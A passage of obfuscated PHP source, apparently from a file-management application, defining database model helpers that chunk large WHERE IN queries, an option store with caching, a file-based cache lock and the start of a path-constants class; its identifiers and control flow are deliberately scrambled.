count($FÈæ’¬Ö ) != 4) { continue; } $dà„´ ô×ë = $FÈæ’¬Ö [0] . $dÜ™½ĞŞšÏ[359] . $FÈæ’¬Ö [1] . $dÜ™½ĞŞšÏ[113]; $D´òÁÔÖÁ³ = $FÈæ’¬Ö [2] . $dÜ™½ĞŞšÏ[359] . $FÈæ’¬Ö [3] . $dÜ™½ĞŞšÏ[113]; $DŠ¡Û³Ó› = "\x75\160\x64\x61\x74\x65\x20{$Fáš˜ÈÔá©}\40\163\145\x74\x20{$D´òÁÔÖÁ³}\40\167\x68\145\x72\145\40{$dà„´ ô×ë}\x3b"; $this->execute($DŠ¡Û³Ó›); } } protected $_chunkEvent = false; protected $_chunkEventParam = false; public function chunkEventSet($aİßœãŸ = false, $e¤÷¢••ÑÕ = false) { $this->_chunkEvent = $aİßœãŸ; $this->_chunkEventParam = $e¤÷¢••ÑÕ; } private function chunkEventCheck($dŒíª»”£) { if (!$this->_chunkEvent) { return; } $Aïå©‚ÑÄ = is_array($this->_chunkEventParam) ? $this->_chunkEventParam : array(); $Aïå©‚ÑÄ[$_SERVER[Äº¡•ô™Ÿ][360]] = $dŒíª»”£; Hook::trigger($this->_chunkEvent, $Aïå©‚ÑÄ); } public function addAll($bŸŠ…²³Ê, $c‡–”ÃÕë = array(), $E•ÁÕàÈ¯× = false) { goto bÌùÚ¢¥Šƒ; Båà³¤áœÔ: if (method_exists($this->db, $C „¸¢ß‚[257])) { for ($b¨ÆÙÑ×¯ = 0; $b¨ÆÙÑ×¯ < count($bŸŠ…²³Ê); $b¨ÆÙÑ×¯ += $b–Ã‚Ã™ùÓ) { $CÈ¢¥ÅœØ = array_slice($bŸŠ…²³Ê, $b¨ÆÙÑ×¯, $b–Ã‚Ã™ùÓ); if (!is_array($CÈ¢¥ÅœØ) || count($CÈ¢¥ÅœØ) == 0) { break; } $CÕ¸·Ã™½° = $this->db->insertAll($CÈ¢¥ÅœØ, $c‡–”ÃÕë, $E•ÁÕàÈ¯×); $this->chunkEventCheck(count($CÈ¢¥ÅœØ)); } $this->chunkEventSet(); } else { $this->startTrans(); foreach ($bŸŠ…²³Ê as $Dö‚ßèÈù => $A…¤´˜°÷¡) { $CÕ¸·Ã™½° = $this->db->insert($A…¤´˜°÷¡, $c‡–”ÃÕë, $E•ÁÕàÈ¯×); } $this->commit(); } if (!1 !== $CÕ¸·Ã™½°) { $c£»Õñéäñ = $this->getLastInsID(); if ($c£»Õñéäñ) { return $c£»Õñéäñ; } } return $CÕ¸·Ã™½°; goto dÙé¶ó†­; bÌùÚ¢¥Šƒ: $C „¸¢ß‚ =& $_SERVER[Äº¡•ô™Ÿ]; ignore_timeout(); $b–Ã‚Ã™ùÓ = self::SQL_WHERE_IN_CHUNK; goto cäºİ©ˆº’; cäºİ©ˆº’: if (empty($bŸŠ…²³Ê)) { $this->error = think_lang($C „¸¢ß‚[256]); return !1; } $c‡–”ÃÕë = $this->_parseOptions($c‡–”ÃÕë); foreach ($bŸŠ…²³Ê as $Dö‚ßèÈù => $A…¤´˜°÷¡) { $bŸŠ…²³Ê[$Dö‚ßèÈù] = $this->_facade($A…¤´˜°÷¡); $this->_beforeInsert($bŸŠ…²³Ê[$Dö‚ßèÈù], $c‡–”ÃÕë); } goto Båà³¤áœÔ; dÙé¶ó†­: } public function save($bĞÔ²çğïÄ = '', $E§¿–§ƒï¨ = array()) { goto eŠİŠõÈ´; B‚òÜ‰øÜÔ: for ($b¾“×Íµğ = 0; $b¾“×Íµğ < $DÅÏŸÆ¶ò; $b¾“×Íµğ += $d÷¥—äùæ) { $eß„‚ Š¢ = array_slice($bŸª»ÍÉ¢î, $b¾“×Íµğ, $d÷¥—äùæ); if (!is_array($eß„‚ Š¢) || count($eß„‚ Š¢) == 0) { break; } $CêãËÜòä[$cïÃÚÒ™ä¢[260]][$e„¡ø‘‘ïØ][1] = $eß„‚ Š¢; $this->optionsValue($CêãËÜòä); $B¨×Ó½â•µ += parent::save($bĞÔ²çğïÄ, $E§¿–§ƒï¨); $this->chunkEventCheck(count($eß„‚ Š¢)); } $this->chunkEventSet(); return $B¨×Ó½â•µ; goto C½ÛÊÑæã„; E³¦ƒŞ–Ÿƒ: $e„¡ø‘‘ïØ = $this->findWhereField($CêãËÜòä); if (!$e„¡ø‘‘ïØ) { return parent::save($bĞÔ²çğïÄ, $E§¿–§ƒï¨); } $B¨×Ó½â•µ = 0; goto dÒ¢Õ®“Ê¨; dÒ¢Õ®“Ê¨: $bŸª»ÍÉ¢î = $CêãËÜòä[$cïÃÚÒ™ä¢[260]][$e„¡ø‘‘ïØ][1]; $bŸª»ÍÉ¢î = is_array($bŸª»ÍÉ¢î) ? $bŸª»ÍÉ¢î : array(); $DÅÏŸÆ¶ò = count($bŸª»ÍÉ¢î); goto B‚òÜ‰øÜÔ; eŠİŠõÈ´: $cïÃÚÒ™ä¢ =& $_SERVER[Äº¡•ô™Ÿ]; $d÷¥—äùæ = self::SQL_WHERE_IN_CHUNK; $CêãËÜòä = $this->optionsValue(); goto E³¦ƒŞ–Ÿƒ; C½ÛÊÑæã„: } public function add($bÆ¾ ’ì›Ç = '', $Fã—Š¸õ´º = array(), $cñ¢¬‘Òá¬ = false) { if ($this->addTaskStatus && is_array($bÆ¾ ’ì›Ç)) { $this->addTaskData[] = $bÆ¾ ’ì›Ç; return; } return parent::add($bÆ¾ ’ì›Ç, $Fã—Š¸õ´º, $cñ¢¬‘Òá¬); } private $addTaskStatus = false; private $addTaskData = array(); public function addTaskStart() { $this->addTaskStatus = !0; $this->addTaskData = array(); } public function addTaskEnd() { if (!$this->addTaskStatus) { return; } $this->addAll($this->addTaskData); $this->addTaskStatus = !1; $this->addTaskData = array(); } public function select($eù‡©¥–ÔÄ = array()) { goto DŠ”Ñ”Š‰Ğ; DŠ”Ñ”Š‰Ğ: $e÷°Ô´Éé =& $_SERVER[Äº¡•ô™Ÿ]; $a‰ùÜ©Èš = self::SQL_WHERE_IN_CHUNK; $Fá¡¦„˜â° = $this->optionsValue(); goto fàˆâËğ™–; fàˆâËğ™–: $fØê¥‘œàÛ = $this->findWhereField($Fá¡¦„˜â°); if (!$fØê¥‘œàÛ || isset($Fá¡¦„˜â°[$e÷°Ô´Éé[277]]) || isset($Fá¡¦„˜â°[$e÷°Ô´Éé[337]])) { return parent::select($eù‡©¥–ÔÄ); } $féîˆ’Ò = $Fá¡¦„˜â°[$e÷°Ô´Éé[260]][$fØê¥‘œàÛ][1]; goto BÛ×Øéí£Æ; aëÙ­—äÖ: return $C¬Ï”‰¼‡Í; goto fæª¸Â‚; BÛ×Øéí£Æ: $féîˆ’Ò = is_array($féîˆ’Ò) ? $féîˆ’Ò : array(); $C¬Ï”‰¼‡Í = null; for ($BÏ¢‘ÇÙ = 0; $BÏ¢‘ÇÙ < count($féîˆ’Ò); $BÏ¢‘ÇÙ += $a‰ùÜ©Èš) { $eğÚÃÙ™Ã« = array_slice($féîˆ’Ò, $BÏ¢‘ÇÙ, $a‰ùÜ©Èš); if (!is_array($eğÚÃÙ™Ã«) || count($eğÚÃÙ™Ã«) == 0) { break; } $Fá¡¦„˜â°[$e÷°Ô´Éé[260]][$fØê¥‘œàÛ][1] = $eğÚÃÙ™Ã«; $this->optionsValue($Fá¡¦„˜â°); $e¨‹¶†âá› = parent::select($eù‡©¥–ÔÄ); if (!$e¨‹¶†âá›) { continue; } if (is_null($C¬Ï”‰¼‡Í)) { $C¬Ï”‰¼‡Í = array(); } $C¬Ï”‰¼‡Í = array_merge($C¬Ï”‰¼‡Í, $e¨‹¶†âá›); } goto aëÙ­—äÖ; fæª¸Â‚: } public function delete($fâˆ…ŒØ–Ë = array()) { goto d¯’Áµ´ó; cŒ¸éÚ’Åç: $Bˆ“¢’…Ñ™ = $this->findWhereField($e¶¿ŸÆ”’); if (!$Bˆ“¢’…Ñ™) { return parent::delete($fâˆ…ŒØ–Ë); } $B½îê°¢– = 0; goto aË¢‡º†…; d¯’Áµ´ó: $d«¯¸×ğ¢» =& $_SERVER[Äº¡•ô™Ÿ]; $CÀÅİ»©ƒŠ = self::SQL_WHERE_IN_CHUNK; $e¶¿ŸÆ”’ = $this->optionsValue(); goto cŒ¸éÚ’Åç; aË¢‡º†…: $bºùŠÑ‡ƒ” = $e¶¿ŸÆ”’[$d«¯¸×ğ¢»[260]][$Bˆ“¢’…Ñ™][1]; $bºùŠÑ‡ƒ” = is_array($bºùŠÑ‡ƒ”) ? $bºùŠÑ‡ƒ” : array(); for ($eö¨ÁõêìÛ = 0; $eö¨ÁõêìÛ < count($bºùŠÑ‡ƒ”); $eö¨ÁõêìÛ += $CÀÅİ»©ƒŠ) { $a´„¾µùóÂ = array_slice($bºùŠÑ‡ƒ”, $eö¨ÁõêìÛ, $CÀÅİ»©ƒŠ); if (!is_array($a´„¾µùóÂ) || count($a´„¾µùóÂ) == 0) { break; } $e¶¿ŸÆ”’[$d«¯¸×ğ¢»[260]][$Bˆ“¢’…Ñ™][1] = $a´„¾µùóÂ; $this->optionsValue($e¶¿ŸÆ”’); $B½îê°¢– += parent::delete($fâˆ…ŒØ–Ë); } goto bĞ¾ÈÀ‘‡; bĞ¾ÈÀ‘‡: return $B½îê°¢–; goto C»å„èßä³; C»å„èßä³: } private function findWhereField($EÔßç¤©£ä) { $BáÅÍî…µ‹ =& $_SERVER[Äº¡•ô™Ÿ]; $c¥ôÁ¸Ğ– = self::SQL_WHERE_IN_CHUNK; if (!is_array($EÔßç¤©£ä) || !is_array($EÔßç¤©£ä[$BáÅÍî…µ‹[260]])) { return !1; } foreach ($EÔßç¤©£ä[$BáÅÍî…µ‹[260]] as $cÒ•““‰ˆ¹ => $fÜê±¸œÓØ) { if (is_array($fÜê±¸œÓØ) && isset($fÜê±¸œÓØ[0]) && is_string($fÜê±¸œÓØ[0]) && strtolower($fÜê±¸œÓØ[0]) == $BáÅÍî…µ‹[7] && is_array($fÜê±¸œÓØ[1]) && count($fÜê±¸œÓØ[1]) > $c¥ôÁ¸Ğ–) { ignore_timeout(); return $cÒ•““‰ˆ¹; } } return !1; } } class ModelBaseLight { public $optionType = ''; public $modelType = "\123\171\x73\x74\x65\155\x4f\160\x74\x69\157\x6e"; public $field = array(); public function listData($a…“£ˆŠå÷ = false, $C©Šî³¸×Ô = "\x6d\x6f\x64\x69\146\x79\124\151\x6d\145", $C˜î‘›ëå‚ = false) { $c¶Ù†Î¸Ø± = Model($this->modelType)->get(!1, $this->optionType, !0); if (!$c¶Ù†Î¸Ø±) { return $a…“£ˆŠå÷ ? null : array(); } if (!$a…“£ˆŠå÷) { $c¶Ù†Î¸Ø± = array_filter(array_values($c¶Ù†Î¸Ø±)); return array_sort_by($c¶Ù†Î¸Ø±, $C©Šî³¸×Ô, $C˜î‘›ëå‚); } return $c¶Ù†Î¸Ø±[$_SERVER[Äº¡•ô™Ÿ][361] . $a…“£ˆŠå÷]; } public function insert($EùµØõ¡ïƒ) { goto D‡ì×¦¹ ç; D‡ì×¦¹ ç: $DÍÕìàŒ² =& $_SERVER[Äº¡•ô™Ÿ]; $EùµØõ¡ïƒ = array_field_key($EùµØõ¡ïƒ, $this->field); $D‚ñ±ƒİËà = Model($this->modelType)->get($DÍÕìàŒ²[362], $this->optionType . $DÍÕìàŒ²[363]); goto CÃ½æ—š¥ø; D‘…šŸØè…: $EùµØõ¡ïƒ[$DÍÕìàŒ²[107]] = time(); Model($this->modelType)->set($DÍÕìàŒ²[362], $D‚ñ±ƒİËà, $this->optionType . $DÍÕìàŒ²[363]); Model($this->modelType)->set($DÍÕìàŒ²[361] . $D‚ñ±ƒİËà, $EùµØõ¡ïƒ, $this->optionType); goto d°¢˜Ä’¡Ë; d°¢˜Ä’¡Ë: return $D‚ñ±ƒİËà; goto fö×œø¶ŸŞ; CÃ½æ—š¥ø: $D‚ñ±ƒİËà = $D‚ñ±ƒİËà ? $D‚ñ±ƒİËà : 0; $EùµØõ¡ïƒ[$DÍÕìàŒ²[364]] = ++$D‚ñ±ƒİËà; $EùµØõ¡ïƒ[$DÍÕìàŒ²[184]] = time(); goto D‘…šŸØè…; fö×œø¶ŸŞ: } public function update($BÂãñ„Œš‹, $aİ¾¿ÉÑ¦) { goto C¯”¹×È‘; C¯”¹×È‘: $f­ÏÀ°Ò =& $_SERVER[Äº¡•ô™Ÿ]; $aİ¾¿ÉÑ¦ = array_field_key($aİ¾¿ÉÑ¦, $this->field); $a¿Ó¢¿Ì·å = $this->listData($BÂãñ„Œš‹); goto eÌŒ‚îó®î; Aï…÷½˜±§: return Model($this->modelType)->set($f­ÏÀ°Ò[361] . $BÂãñ„Œš‹, $aİ¾¿ÉÑ¦, $this->optionType); goto FÁğª¬†î„; eÌŒ‚îó®î: if (!$a¿Ó¢¿Ì·å) { return !1; } $aİ¾¿ÉÑ¦ = array_merge($a¿Ó¢¿Ì·å, $aİ¾¿ÉÑ¦); $aİ¾¿ÉÑ¦[$f­ÏÀ°Ò[107]] = time(); goto Aï…÷½˜±§; FÁğª¬†î„: } public function remove($b¹½ÊÕí) { return Model($this->modelType)->remove($_SERVER[Äº¡•ô™Ÿ][361] . $b¹½ÊÕí, $this->optionType); } public function clear() { $eÑ‘œ¿ºñ¼ =& $_SERVER[Äº¡•ô™Ÿ]; Model($this->modelType)->remove($eÑ‘œ¿ºñ¼[362], $this->optionType . $eÑ‘œ¿ºñ¼[363]); return Model($this->modelType)->remove(null, $this->optionType); } public function cacheClear() { return Model($this->modelType)->cacheRemove($this->optionType); } public function findByKey($f–”»’©, $E¤Ï¡ÑÏõŒ) { if (!$E¤Ï¡ÑÏõŒ) { return !1; } $DÃŒ­ä‹„ = $this->listData(); $DÃŒ­ä‹„ = array_to_keyvalue($DÃŒ­ä‹„, $f–”»’©); return isset($DÃŒ­ä‹„[$E¤Ï¡ÑÏõŒ]) ? $DÃŒ­ä‹„[$E¤Ï¡ÑÏõŒ] : !1; } public function findByName($Eó¥ÓÇÉÄĞ) { return $this->findByKey($_SERVER[Äº¡•ô™Ÿ][28], $Eó¥ÓÇÉÄĞ); } protected function resetData($BÉ‹âÇÆ) { $D«–Å—Î =& $_SERVER[Äº¡•ô™Ÿ]; $BÉ‹âÇÆ = is_array($BÉ‹âÇÆ) ? $BÉ‹âÇÆ : array(); $A™ÁĞê™ = array(); for ($Fº£ô—³ÁŠ = 0; $Fº£ô—³ÁŠ < count($BÉ‹âÇÆ); $Fº£ô—³ÁŠ++) { $A™ÁĞê™[$D«–Å—Î[361] . $BÉ‹âÇÆ[$Fº£ô—³ÁŠ][$D«–Å—Î[364]]] = $BÉ‹âÇÆ[$Fº£ô—³ÁŠ]; } return Model($this->modelType)->set($A™ÁĞê™, !1, $this->optionType); } private function getAutoName($AÌÁéÙ…¹¯) { $Eóê¤ºíÌá = array_to_keyvalue($this->listData(), $_SERVER[Äº¡•ô™Ÿ][28]); if (!$Eóê¤ºíÌá || !isset($Eóê¤ºíÌá[$AÌÁéÙ…¹¯])) { return $AÌÁéÙ…¹¯; } for ($DÕíÁ­¾â• = 1; $DÕíÁ­¾â• < count($Eóê¤ºíÌá); $DÕíÁ­¾â•++) { $c×‹Í¸Š‚« = $AÌÁéÙ…¹¯ . "\50{$DÕíÁ­¾â•}\x29"; if (!isset($Eóê¤ºíÌá[$c×‹Í¸Š‚«])) { return $c×‹Í¸Š‚«; } } return $c×‹Í¸Š‚«; } } class ModelBaseOption extends ModelBase { protected $tableName = ''; protected $jsonField = array(); public function get($Fœ‹õ‡òÕ° = false, $AùÎô³Šİí = '', $cÖì‡ƒè = false) { goto AàòÛ¥Íáó; D–­»Ÿ÷¿: $EêÉç•‘‚á = is_array($EêÉç•‘‚á) ? $EêÉç•‘‚á : array(); if (is_array($b•ƒ¦˜½Ó)) { $b•ƒ¦˜½Ó = array_merge($EêÉç•‘‚á, $b•ƒ¦˜½Ó); return $Fœ‹õ‡òÕ° ? isset($b•ƒ¦˜½Ó[$Fœ‹õ‡òÕ°]) ? $b•ƒ¦˜½Ó[$Fœ‹õ‡òÕ°] : null : $b•ƒ¦˜½Ó; } $Bâ±ÏÀó®ª = $this->filterWhere(array($AĞ˜ì”Çã[29] => $AùÎô³Šİí)); goto aºøàĞò²¸; AàòÛ¥Íáó: $AĞ˜ì”Çã =& $_SERVER[Äº¡•ô™Ÿ]; $b•ƒ¦˜½Ó = $this->cacheGet($AùÎô³Šİí); $EêÉç•‘‚á = $this->optionDefault($AùÎô³Šİí); goto D–­»Ÿ÷¿; aºøàĞò²¸: $b•ƒ¦˜½Ó = $this->where($Bâ±ÏÀó®ª)->select(); $b•ƒ¦˜½Ó = array_to_keyvalue($b•ƒ¦˜½Ó, $AĞ˜ì”Çã[89], $AĞ˜ì”Çã[356]); foreach ($b•ƒ¦˜½Ó as $eÕØ¡è¬Œœ => $c‡‹¡ÂÎŸ) { if ($cÖì‡ƒè || in_array($eÕØ¡è¬Œœ, $this->jsonField)) { $b•ƒ¦˜½Ó[$eÕØ¡è¬Œœ] = json_decode($c‡‹¡ÂÎŸ, !0); } } goto b¬×î¹Á£ª; b¬×î¹Á£ª: $this->cacheSet($AùÎô³Šİí, $b•ƒ¦˜½Ó); $b•ƒ¦˜½Ó = array_merge($EêÉç•‘‚á, $b•ƒ¦˜½Ó); return $Fœ‹õ‡òÕ° ? $b•ƒ¦˜½Ó[$Fœ‹õ‡òÕ°] : $b•ƒ¦˜½Ó; goto F·ÜÀğæ¡; F·ÜÀğæ¡: } public function set($AËœ©ÌğÎ, $f’›ÈÅÌò = false, $dßŠñÂ· = '') { goto F·¡ˆ«î’â; eáÒ±Ûê¢–: $béÓŸùé¼» = is_array($AËœ©ÌğÎ) ? $AËœ©ÌğÎ : array($AËœ©ÌğÎ => $f’›ÈÅÌò); foreach ($béÓŸùé¼» as $DÖÖÛ¿İ‚¯ => $CÅ•‹«ß) { if (is_array($CÅ•‹«ß)) { $CÅ•‹«ß = json_encode_force($CÅ•‹«ß); } $this->checkLength($CÅ•‹«ß, !1, $this->tableName . $a©‡¥î×–[4] . $AËœ©ÌğÎ); $CÅ•‹«ß = self::textEncode($CÅ•‹«ß); $béÓŸùé¼» = array($a©‡¥î×–[29] => $dßŠñÂ·, $a©‡¥î×–[89] => $DÖÖÛ¿İ‚¯, $a©‡¥î×–[356] => $CÅ•‹«ß); $e× ŒÄ†Æ[] = $this->filterWhere($béÓŸùé¼»); } if (!$e× ŒÄ†Æ) { return !0; } goto e±®Š´‹¾; e±®Š´‹¾: return $this->addAll($e× ŒÄ†Æ, array(), !0); goto fÆ×¢ÈÔñ; F·¡ˆ«î’â: $a©‡¥î×– =& $_SERVER[Äº¡•ô™Ÿ]; $this->cacheRemove($dßŠñÂ·); $e× ŒÄ†Æ = array(); goto eáÒ±Ûê¢–; fÆ×¢ÈÔñ: } protected function optionDefault($Då÷¨©¾“É = '') { return !1; } public function setDeep($EôÀ™ìÙ„, $dá ”Í¼Ìì = false, $d§£³¨ß„è = '') { $Aøã¸–‰Û« = explode($_SERVER[Äº¡•ô™Ÿ][93], $EôÀ™ìÙ„); $d†ô½çİª = $this->get(); array_set_value($d†ô½çİª, $EôÀ™ìÙ„, $dá ”Í¼Ìì); $this->set($Aøã¸–‰Û«[0], $d†ô½çİª[$Aøã¸–‰Û«[0]], $d§£³¨ß„è); } public function remove($d‹åÒ‹Í†·, $EŸµÕùù—ó = '') { $fƒÂ…¯å· =& $_SERVER[Äº¡•ô™Ÿ]; $this->cacheRemove($EŸµÕùù—ó); $d¤¿˜¹…®‚ = $this->filterWhere(array($fƒÂ…¯å·[89] => $d‹åÒ‹Í†·, $fƒÂ…¯å·[29] => $EŸµÕùù—ó)); if (is_null($d‹åÒ‹Í†·)) { unset($d¤¿˜¹…®‚[$fƒÂ…¯å·[89]]); } return $this->where($d¤¿˜¹…®‚)->delete(); } public function cacheSet($eïéº‘‰Å´, $BÍ‚¯Š‘ÛÁ = false) { return Cache::set($this->cacheKey($eïéº‘‰Å´), $BÍ‚¯Š‘ÛÁ); } public function cacheGet($aÌãÔÊ…Ï®) { return Cache::get($this->cacheKey($aÌãÔÊ…Ï®)); } public function cacheRemove($f”Çò³ª«í) { return Cache::remove($this->cacheKey($f”Çò³ª«í)); } protected function filterWhere($B‰è‘¾Áì) { return $B‰è‘¾Áì; } protected function cacheKey($C¾£Ÿ¢Áå) { return $C¾£Ÿ¢Áå; } } goto E‰²¬óØåí; Aè±ªÇÅ¤Ì: class CacheLock { protected static $handle; protected static $timeout; protected static $errorMsg = ''; protected static $lockItem = array(); public static function init() { goto C«Ìîô›§; CáÈÓáÒª: if ($C‚ˆÔ¿÷¯™ == $eñ½¨¿¢°[17] && $DÇßÔ¡ó‘ê == $eñ½¨¿¢°[9]) { $C‚ˆÔ¿÷¯™ = $eñ½¨¿¢°[164]; } switch ($C‚ˆÔ¿÷¯™) { case $eñ½¨¿¢°[759]: self::$handle = new CacheLockRedis(); break; case $eñ½¨¿¢°[760]: self::$handle = new CacheLockMemcached(); break; case $eñ½¨¿¢°[17]: self::$handle = new CacheLockDatabase(); break; case $eñ½¨¿¢°[164]: self::$handle = new CacheLockFile(); break; default: break; } return self::$handle; goto dßïµ‹¤; fŒø•Ë†: self::$timeout = $bÕŞ·ÀÂ­œ[$eñ½¨¿¢°[769]] ? $bÕŞ·ÀÂ­œ[$eñ½¨¿¢°[769]] : 10; $DÇßÔ¡ó‘ê = _get($GLOBALS[$eñ½¨¿¢°[6]], $eñ½¨¿¢°[770]); $C‚ˆÔ¿÷¯™ = $bÕŞ·ÀÂ­œ[$eñ½¨¿¢°[756]] ? $bÕŞ·ÀÂ­œ[$eñ½¨¿¢°[756]] : $eñ½¨¿¢°[164]; goto CáÈÓáÒª; C«Ìîô›§: $eñ½¨¿¢° =& $_SERVER[Äº¡•ô™Ÿ]; if (self::$handle) { return self::$handle; } $bÕŞ·ÀÂ­œ = $GLOBALS[$eñ½¨¿¢°[6]][$eñ½¨¿¢°[334]]; goto fŒø•Ë†; dßïµ‹¤: } private static function key($AµÑ´ŞÔ´Ñ) { return $_SERVER[Äº¡•ô™Ÿ][771] . Cache::key($AµÑ´ŞÔ´Ñ); } public static function initReset() { self::$handle = !1; } public static function setErrorMsg($C…˜Äß»™ = '') { self::$errorMsg = $C…˜Äß»™; } public static function lockGlobal($Dš·ö‡ºÕ, $Cí”ñøŞô¸) { return self::lock($Dš·ö‡ºÕ, $Cí”ñøŞô¸, !0); } public static function lock($b‘Š…„˜†Ö, $DŠæèŠ·È = false, $cœë²®æ¦ç = false) { goto bê¾Â¼Üİ; E¦ç¯î¯’š: $DŠæèŠ·È = $DŠæèŠ·È ? $DŠæèŠ·È : self::$timeout; $FóâõŒù¾ = $BÜâ’Ú‡¨Ô->lock($eÏäâé˜á°, $DŠæèŠ·È); if (!$FóâõŒù¾) { $a†ëÑ¶‰½ = $CŸ‘õîÊŸµ[772] . $DŠæèŠ·È . $CŸ‘õîÊŸµ[67] . self::$errorMsg . $CŸ‘õîÊŸµ[67] . get_caller_msg(); $fÁù¬ÑæØ = "\x4c\x6f\x63\153\40\141\143\x74\x69\x6f\x6e\72\40{$eÏäâé˜á°}\40\x74\151\155\145\x6f\x75\164\x2c\x6f\x76\x65\162\x20{$DŠæèŠ·È}\x20\163"; $fÁù¬ÑæØ = self::$errorMsg ? self::$errorMsg : $d«Ş›Ÿ°õù; write_log($a†ëÑ¶‰½, $CŸ‘õîÊŸµ[773]); show_json($fÁù¬ÑæØ, !1); } goto D¨Ö†­„™¿; bê¾Â¼Üİ: $CŸ‘õîÊŸµ =& $_SERVER[Äº¡•ô™Ÿ]; $BÜâ’Ú‡¨Ô = self::init(); $eÏäâé˜á° = self::key($b‘Š…„˜†Ö); goto E¦ç¯î¯’š; D¨Ö†­„™¿: if (!$cœë²®æ¦ç) { self::$lockItem[$eÏäâé˜á°] = !0; } return $FóâõŒù¾; goto dõÉÖ™î¸; dõÉÖ™î¸: } public static function lockGet($A‡îÈ¸ÕÊë) { $eùãßí‡¼ò = self::key($A‡îÈ¸ÕÊë); if (self::$lockItem[$eùãßí‡¼ò]) { return self::$lockItem[$eùãßí‡¼ò]; } return self::init()->lockGet($eùãßí‡¼ò); } public static function unlock($B¼“¹µàİ‘) { $b’ÖœÇÍˆ˜ = self::key($B¼“¹µàİ‘); self::$lockItem[$b’ÖœÇÍˆ˜] = null; return self::init()->unlock($b’ÖœÇÍˆ˜); } public static function unlockRuntime() { $e¨¢Èõİó” =& $_SERVER[Äº¡•ô™Ÿ]; $Aš†Å¶îĞ¿ = self::init(); $e¬¥¨ÏÎõõ = !1; foreach (self::$lockItem as $A¾™î±˜¬î => $bŒ¶Şå¨¢¾) { if (!$bŒ¶Şå¨¢¾) { continue; } $Aš†Å¶îĞ¿->unlock($A¾™î±˜¬î); if (!$e¬¥¨ÏÎõõ) { $e¬¥¨ÏÎõõ = !0; write_log($e¨¢Èõİó”[774] . $A¾™î±˜¬î . $e¨¢Èõİó”[67] . get_caller_msg(), $e¨¢Èõİó”[773]); continue; } write_log($e¨¢Èõİó”[774] . $A¾™î±˜¬î, $e¨¢Èõİó”[773]); } } } function cacheLockWait() { usleep(mt_rand(5, 50) * 100); } class CacheLockFile { private static $cachePath; private static $caches; public function __construct() { $A’ÛÊÎõÈù =& $_SERVER[Äº¡•ô™Ÿ]; $fğÍòí†ÎÔ = $GLOBALS[$A’ÛÊÎõÈù[6]][$A’ÛÊÎõÈù[334]]; self::$cachePath = $fğÍòí†ÎÔ[$A’ÛÊÎõÈù[164]][$A’ÛÊÎõÈù[75]]; @mkdir(self::$cachePath, 511, !0); } public function lock($BÃ‹ĞˆñŞ, $fÏÎÏˆê‡ = 0) { goto dË¬¯¬Î”; dË¬¯¬Î”: $BŸäŒ©øø¼ =& $_SERVER[Äº¡•ô™Ÿ]; $d’êî™Ö¦ = microtime(!0); $E®©ãôÉ† = $d’êî™Ö¦ + $fÏÎÏˆê‡ + 0.0001; goto a®Ûë„áÀ¯; eÊŸ³ÊùÁ: $this->unlock($BÃ‹ĞˆñŞ); return !1; goto Bó«‰Õ‰Éî; a®Ûë„áÀ¯: $Aï¸‘ËÕ«” = rtrim(self::$cachePath, $BŸäŒ©øø¼[8]) . $BŸäŒ©øø¼[775] . md5($BÃ‹ĞˆñŞ) . $BŸäŒ©øø¼[776]; if (file_exists($Aï¸‘ËÕ«”) && filemtime($Aï¸‘ËÕ«”) && filemtime($Aï¸‘ËÕ«”) < time() - 10) { @unlink($Aï¸‘ËÕ«”); } do { if (file_exists($Aï¸‘ËÕ«”)) { cacheLockWait(); continue; } $fá¹Œ‰ˆ = fopen($Aï¸‘ËÕ«”, $BŸäŒ©øø¼[777]); if (!$fá¹Œ‰ˆ) { return !1; } $B†ŸÏÙÁã‘ = flock($fá¹Œ‰ˆ, LOCK_EX | LOCK_NB); self::$caches[$BÃ‹ĞˆñŞ] = array($BŸäŒ©øø¼[778] => $fá¹Œ‰ˆ, $BŸäŒ©øø¼[164] => $Aï¸‘ËÕ«”); fwrite($fá¹Œ‰ˆ, $E®©ãôÉ†); clearstatcache(); if ($fá¹Œ‰ˆ && $B†ŸÏÙÁã‘) { return !0; } cacheLockWait(); } while (microtime(!0) < $E®©ãôÉ†); goto eÊŸ³ÊùÁ; Bó«‰Õ‰Éî: } public function lockGet($b¨®Û´Û) { $dŒ•ğãËŞñ =& $_SERVER[Äº¡•ô™Ÿ]; $FÁ³ìˆˆÂ½ = rtrim(self::$cachePath, $dŒ•ğãËŞñ[8]) . $dŒ•ğãËŞñ[775] . md5($b¨®Û´Û) . $dŒ•ğãËŞñ[776]; return file_exists($FÁ³ìˆˆÂ½); } public function unlock($e…¥«ØÉî) { goto e“‡›¯¾¹; aåÏò¢Úù: @flock($eŠ¿˜İ•ˆ[$cØÓ¤ÌŞå¬[778]], LOCK_UN); @fclose($eŠ¿˜İ•ˆ[$cØÓ¤ÌŞå¬[778]]); @unlink($eŠ¿˜İ•ˆ[$cØÓ¤ÌŞå¬[164]]); goto b‚­Ñ£­ç©; e“‡›¯¾¹: $cØÓ¤ÌŞå¬ =& $_SERVER[Äº¡•ô™Ÿ]; $eŠ¿˜İ•ˆ = self::$caches[$e…¥«ØÉî]; if (!$eŠ¿˜İ•ˆ) { return; } goto aåÏò¢Úù; b‚­Ñ£­ç©: unset(self::$caches[$e…¥«ØÉî]); goto CˆÌÏ¥š„ù; CˆÌÏ¥š„ù: } } goto d„šŒ‡ˆØÊ; c°ëî•äâÖ: class KodIO { const KOD_SOURCE = "\173\x73\x6f\x75\x72\x63\x65\x7d"; const KOD_USER_RECYCLE = "\173\165\x73\x65\x72\122\x65\x63\x79\x63\154\145\175"; const KOD_USER_FAV = "\173\x75\163\145\x72\106\141\166\175"; const KOD_USER_FILE_TAG = "\173\165\163\145\x72\x46\x69\x6c\x65\124\x61\147\175"; const KOD_USER_FILE_TYPE = "\x7b\x75\163\145\x72\x46\151\x6c\x65\x54\x79\160\x65\175"; const KOD_GROUP_ROOT_SELF = "\x7b\x67\162\x6f\x75\160\x52\x6f\x6f\x74\x53\x65\x6c\x66\x7d"; const KOD_USER_SHARE = "\x7b\165\x73\145\162\123\150\141\162\x65\175"; const KOD_USER_SHARE_LINK = "\173\x75\x73\x65\x72\x53\x68\x61\x72\145\114\151\x6e\153\x7d"; const KOD_USER_SHARE_TO_ME = "\x7b\163\150\x61\x72\145\124\x6f\x4d\145\175"; const KOD_SHARE_ITEM = "\173\x73\x68\141\x72\145\111\164\145\x6d\175"; const KOD_SHARE_LINK = "\x7b\163\x68\x61\x72\145\x49\x74\145\155\114\151\x6e\153\x7d"; const KOD_SEARCH = "\x7b\x73\145\x61\x72\143\x68\175"; const KOD_BLOCK = "\x7b\x62\154\x6f\143\153\x7d"; const KOD_IO = 